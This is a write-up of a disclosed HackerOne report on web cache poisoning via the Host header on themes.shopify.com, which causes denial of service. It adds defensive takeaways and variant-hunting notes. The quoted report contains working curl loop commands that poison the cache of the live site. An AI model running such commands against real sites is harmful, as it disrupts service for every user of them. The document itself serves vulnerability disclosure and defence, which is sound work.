# Host Header Web Cache Poisoning Leading to Denial of Service on themes.shopify.com

## Metadata
- **Source:** HackerOne
- **Report:** 1096609 | https://hackerone.com/reports/1096609
- **Submitted:** 2021-02-05
- **Reporter:** g4mm4
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Web Cache Poisoning, Host Header Injection, Denial of Service
- **CVEs:** None
- **Category:** memory-binary

## Summary
The themes.shopify.com website is vulnerable to web cache poisoning via HTTP Host header manipulation, allowing an attacker to inject arbitrary port numbers into cached responses. This causes subsequent legitimate users to receive poisoned cache entries with invalid ports (e.g., :1337), breaking asset loading and resulting in denial of service.

## Attack scenario
1. Attacker sends repeated requests to https://themes.shopify.com with a malicious Host header (e.g., 'themes.shopify.com:1337') to poison the CDN/web cache
2. The vulnerable application includes the Host header value in generated HTML (canonical links, resource references) without proper validation
3. The response gets cached by the edge cache/CDN due to insufficient cache-key normalization
4. Legitimate users visiting https://themes.shopify.com receive the poisoned cached response containing 'themes.shopify.com:1337' in resource URLs
5. Browsers attempt to load CSS, images, and JavaScript from the non-existent port :1337, causing resource loading failures
6. User experiences a broken website with missing styles and images, achieving denial of service at scale

## Root cause
The application fails to normalize the Host header when constructing cached responses. The Host header is directly reflected in output (canonical tags, resource URLs) without validation, and the cache key does not sufficiently account for different Host header variations, allowing poisoned entries to be served to other users.

## Attacker mindset
An attacker recognizes that HTTP caches (CDN, reverse proxy) may use insufficient cache-key generation that includes the Host header. By repeatedly requesting with a malicious Host header containing an invalid port, they can poison the shared cache to affect all users visiting the legitimate URL, causing widespread availability issues.

## Defensive takeaways
- Implement strict cache-key normalization that excludes or canonicalizes the Host header to prevent header-based cache poisoning
- Validate and sanitize all HTTP headers, especially Host, before including them in dynamically generated content
- Use allowlist-based Host header validation to reject requests with unexpected hostnames or port numbers
- Ensure canonical links and resource URLs are generated using hardcoded origin values, not request headers
- Implement cache security headers (Vary header) appropriately to separate cached responses by request characteristics
- Monitor cache hit rates and contents for anomalies indicating poisoning attempts
- Use a WAF to detect and block requests with malformed Host headers before they reach the origin

## Variant hunting
Look for web cache poisoning via other header injections (X-Forwarded-Host, X-Original-URL, Referer) on Shopify properties. Test for cache poisoning on other theme/template platforms and Shopify Admin domains. Search for improper cache-key generation on other e-commerce platforms using similar CDN architectures.

## MITRE ATT&CK
- T1190
- T1499

## Notes
The report references PortSwigger's 'Web Cache Entanglement' research, which discusses similar cache poisoning vulnerabilities. The PoC is straightforward: rapid-fire requests with poisoned Host header to establish cache entry, followed by normal requests to retrieve the poisoned content. The impact is significant because it affects all users globally due to shared cache infrastructure. No bounty amount was specified in the report.

## Full report
<details><summary>Expand</summary>

Hi there,
I just found the website:
https://themes.shopify.com
is infected with "Web cache poisoning" via HOST header lead to Denial of Services
Abuse this bug, Attacker can:

Poison your cache with HTTP header Host header with arbitrary PORT which is not opened. This attack may lead to Denial of Services

How to reproduce the issue:
In the 1st terminal, run command likes this:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
----------


In the 2nd terminal, run command below for confirmation this attack is successful or not:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
----------
and the output from command with be confirmed my Host header poisoning worked:
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  <link rel="canonical" href="https://themes.shopify.com:1337/">
        <li><div class="popover-wrapper js-popover-dropdown popover-wrapper--dropdown" data-position="bottom" data-align="left"><button type="button" class="popover__trigger marketing-nav__item marketing-nav__item--primary" itemprop="name">Collections<svg class="icon marketing-nav__arrow" aria-hidden="true" focusable="false"> <use xlink:href="#modules-caret-down" /> </svg></button><div class="popover"><div class="popover__content"><ul class="popover__list"><li><a href="/collections/trending-themes" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-event="Main Nav" data-ga-action="Clicked" data-ga-label="trending-themes">Trending this week </a></li><li><a href="/collections/product-recommendations" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-e
...........
+++

Finally, when user visits the homepage: https://themes.shopify.com, so many images, css, link will not be loaded (Because the port :1337 which appended themes.shopify.com:1337 is not opened
Please see the attached image for details.

cheers,
~g4mm4
References:
https://portswigger.net/research/web-cache-entanglement
Denial of Services

## Impact

Denial of Services

</details>

---
*Analysed by Claude on 2026-05-24*
